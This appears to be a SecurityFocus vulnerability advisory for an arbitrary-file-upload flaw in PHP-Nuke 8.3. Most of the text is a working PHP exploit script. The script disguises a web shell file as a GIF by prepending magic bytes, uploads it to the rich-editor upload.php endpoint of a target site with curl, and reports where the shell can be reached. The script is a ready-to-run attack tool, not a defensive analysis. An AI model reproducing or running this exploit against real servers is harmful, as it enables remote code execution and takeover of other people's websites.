source: http://www.securityfocus.com/bid/48257/info

Phpnuke is prone to an arbitrary-file-upload vulnerability because the application fails to adequately sanitize user-supplied input.

An attacker can exploit this issue to upload arbitrary code and run it in the context of the webserver process.

Phpnuke 8.3 is vulnerable; other versions may also be affected. 

<?php
///////////////////////////////////////////////////
#Iranian Pentesters Home
#PHP Nuke 8.3 MT AFU Vulnerability
#Coded by:4n0nym0us & b3hz4d
#http://www.pentesters.ir
///////////////////////////////////////////////////
//Settings:
$address = 'http://your-target.com';
$file = 'shell.php.01';
$prefix='pentesters_';


//Exploit:
@$file_data = "\x47\x49\x46\x38\x39\x61\x05\x00\x05\x00";
@$file_data .= file_get_contents($file);
file_put_contents($prefix . $file, $file_data);
$file = $prefix . $file;
echo "\n" . "///////////////////////////////////" ."\n";
echo "     Iranian Pentesters Home" . "\n";
echo " PHP Nuke 8.3 MT RFU Vulnerability" . "\n";
echo "///////////////////////////////////" ."\n";
$address_c = $address . '/includes/richedit/upload.php';
$postdata = array("userfile" => "@$file;type=image/gif","upload" => "1","path" => "images","pwd" => "1");
$data =  post_data($address_c, $postdata);
$start = strpos($data, "<img src=\"upload");
if ($start != null)
{
$data = substr($data,$start + 10);
$end = strpos($data, "\"");
$data = substr($data,0,$end);
echo "\n" . "Uploaded File: " . $address . "/includes/richedit/" . $data . "\n";
}
else
echo "\n" . "Upload Failed!!!";
function post_data($address, $data)
{
    $curl = curl_init($address);
    curl_setopt($curl, CURLOPT_USERAGENT, "Opera/9.0 (Windows NT 5.0; U; en)");
    curl_setopt($curl, CURLOPT_POST, 1);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
    $content = curl_exec($curl);
    curl_close($curl);
    return $content;
}
?>

